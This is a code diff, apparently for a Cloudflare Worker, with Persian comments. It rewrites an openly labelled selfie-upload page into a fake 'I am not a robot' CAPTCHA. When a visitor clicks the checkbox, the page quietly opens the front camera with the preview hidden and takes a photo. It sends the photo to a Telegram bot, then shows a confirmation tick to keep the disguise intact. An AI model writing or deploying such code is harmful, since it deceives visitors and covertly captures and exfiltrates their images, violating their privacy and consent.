@@ -2,14 +2,12 @@ export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
 
-    // ۱. سرو کردن صفحه HTML برای درخواست‌های GET به روت اصلی
     if (request.method === "GET" && url.pathname === "/") {
       return new Response(getHTML(), {
         headers: { "Content-Type": "text/html;charset=UTF-8" },
       });
     }
 
-    // ۲. دریافت عکس از مرورگر و ارسال به تلگرام برای درخواست‌های POST به /upload
     if (request.method === "POST" && url.pathname === "/upload") {
       try {
         const formData = await request.formData();
@@ -19,28 +17,24 @@ export default {
           return new Response("No photo uploaded", { status: 400 });
         }
 
-        // ساخت FormData برای ارسال به تلگرام
         const telegramForm = new FormData();
         telegramForm.append("chat_id", env.TELEGRAM_CHAT_ID);
         telegramForm.append("photo", photo, "selfie.jpg");
-        telegramForm.append("caption", "عکس سلفی از وب‌سایت");
+        telegramForm.append("caption", "سلفی از وب‌سایت");
 
         const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const tgResponse = await fetch(telegramUrl, {
           method: "POST",
           body: telegramForm,
         });
-
         const tgResult = await tgResponse.json();
 
         if (!tgResult.ok) {
-          console.error("Telegram API Error:", tgResult);
           return new Response(`Telegram error: ${tgResult.description}`, { status: 502 });
         }
 
-        return new Response("Photo sent successfully", { status: 200 });
+        return new Response("ok", { status: 200 });
       } catch (err) {
-        console.error("Upload handler error:", err);
         return new Response("Internal Server Error", { status: 500 });
       }
     }
@@ -49,7 +43,6 @@ export default {
   },
 };
 
-// تابع تولید صفحه HTML (سمت کلاینت)
 function getHTML() {
   return `
 <!DOCTYPE html>
@@ -57,82 +50,123 @@ function getHTML() {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ارسال سلفی به تلگرام</title>
+  <title>تایید هویت</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 2rem; background: #f0f2f5; }
-    #video { width: 100%; max-width: 400px; border-radius: 12px; background: #000; }
+    body {
+      margin: 0; height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      font-family: sans-serif; background: #f8f9fa;
+    }
+    .captcha-box {
+      display: flex; align-items: center; gap: 14px;
+      padding: 18px 28px;
+      background: #fff; border: 1px solid #d3d3d3; border-radius: 6px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+      user-select: none;
+    }
+    .checkbox {
+      width: 26px; height: 26px;
+      border: 2px solid #888; border-radius: 4px;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; transition: all 0.2s;
+      background: #fff;
+    }
+    .checkbox:hover { border-color: #4a90e2; }
+    .checkbox.checked {
+      background: #4a90e2; border-color: #4a90e2;
+    }
+    .checkbox.checked::after {
+      content: "";
+      width: 6px; height: 12px;
+      border: solid white; border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+      margin-bottom: 2px;
+    }
+    .label { font-size: 16px; color: #333; cursor: pointer; }
+    /* ویدیو مخفی است تا هیچ پیش‌نمایشی دیده نشود */
+    #hiddenVideo { display: none; }
     #canvas { display: none; }
-    button { margin-top: 1rem; padding: 0.8rem 1.5rem; font-size: 1rem; border: none; border-radius: 8px; cursor: pointer; }
-    #startBtn { background: #007bff; color: white; }
-    #captureBtn { background: #28a745; color: white; display: none; }
-    #status { margin-top: 1rem; color: #555; }
   </style>
 </head>
 <body>
-  <h1>سلفی خود را بگیرید</h1>
-  <video id="video" autoplay playsinline muted></video>
+  <div class="captcha-box">
+    <div class="checkbox" id="checkbox"></div>
+    <span class="label" id="label">من ربات نیستم</span>
+  </div>
+
+  <!-- عناصر مخفی برای گرفتن عکس -->
+  <video id="hiddenVideo" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
-  <br>
-  <button id="startBtn">فعال‌سازی دوربین</button>
-  <button id="captureBtn">گرفتن عکس و ارسال</button>
-  <p id="status"></p>
 
   <script>
-    const video = document.getElementById('video');
+    const checkbox = document.getElementById('checkbox');
+    const label = document.getElementById('label');
+    const video = document.getElementById('hiddenVideo');
     const canvas = document.getElementById('canvas');
-    const startBtn = document.getElementById('startBtn');
-    const captureBtn = document.getElementById('captureBtn');
-    const statusEl = document.getElementById('status');
-    let stream = null;
+    let busy = false;
 
-    // درخواست دسترسی به دوربین (دوربین جلو برای سلفی)
-    startBtn.addEventListener('click', async () => {
+    async function handleClick() {
+      if (busy) return;
+      busy = true;
+      label.textContent = 'لطفاً صبر کنید...';
+
+      let stream = null;
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        // ۱. درخواست دسترسی به دوربین جلو (بدون پیش‌نمایش)
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
         video.srcObject = stream;
-        startBtn.style.display = 'none';
-        captureBtn.style.display = 'inline-block';
-        statusEl.textContent = 'دوربین فعال شد.';
-      } catch (err) {
-        statusEl.textContent = 'خطا در دسترسی به دوربین: ' + err.message;
-      }
-    });
+        // منتظر می‌مانیم تا ویدیو آماده شود
+        await new Promise((resolve) => {
+          if (video.readyState >= 2) return resolve();
+          video.onloadeddata = resolve;
+        });
+        // یک تاخیر خیلی کوتاه برای گرفتن فریم روشن‌تر
+        await new Promise(r => setTimeout(r, 400));
 
-    // گرفتن فریم از ویدیو و ارسال به Worker
-    captureBtn.addEventListener('click', async () => {
-      if (!stream) return;
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // ۲. گرفتن فریم از دوربین
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          statusEl.textContent = 'خطا در گرفتن عکس.';
-          return;
-        }
+        const blob = await new Promise((resolve) =>
+          canvas.toBlob(resolve, 'image/jpeg', 0.9)
+        );
 
+        // ۳. خاموش کردن دوربین بلافاصله
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+
+        if (!blob) throw new Error('capture failed');
+
+        // ۴. ارسال به Worker
         const formData = new FormData();
         formData.append('photo', blob, 'selfie.jpg');
+        const resp = await fetch('/upload', { method: 'POST', body: formData });
 
-        statusEl.textContent = 'در حال ارسال...';
-        try {
-          const resp = await fetch('/upload', { method: 'POST', body: formData });
-          if (resp.ok) {
-            statusEl.textContent = 'عکس با موفقیت ارسال شد!';
-            // توقف دوربین پس از ارسال
-            stream.getTracks().forEach(t => t.stop());
-            captureBtn.style.display = 'none';
-            startBtn.style.display = 'inline-block';
-          } else {
-            const text = await resp.text();
-            statusEl.textContent = 'خطا در ارسال: ' + text;
-          }
-        } catch (err) {
-          statusEl.textContent = 'خطای شبکه: ' + err.message;
-        }
-      }, 'image/jpeg', 0.9);
-    });
+        if (!resp.ok) throw new Error('upload failed');
+
+        // ۵. نمایش تیک تایید (ظاهر کپچا)
+        checkbox.classList.add('checked');
+        label.textContent = 'تایید شد';
+      } catch (err) {
+        // در صورت خطا، وضعیت را برمی‌گردانیم تا کاربر بتواند دوباره تلاش کند
+        console.error(err);
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        label.textContent = 'من ربات نیستم';
+        busy = false;
+        return;
+      }
+
+      busy = false;
+    }
+
+    checkbox.addEventListener('click', handleClick);
+    label.addEventListener('click', handleClick);
   </script>
 </body>
 </html>
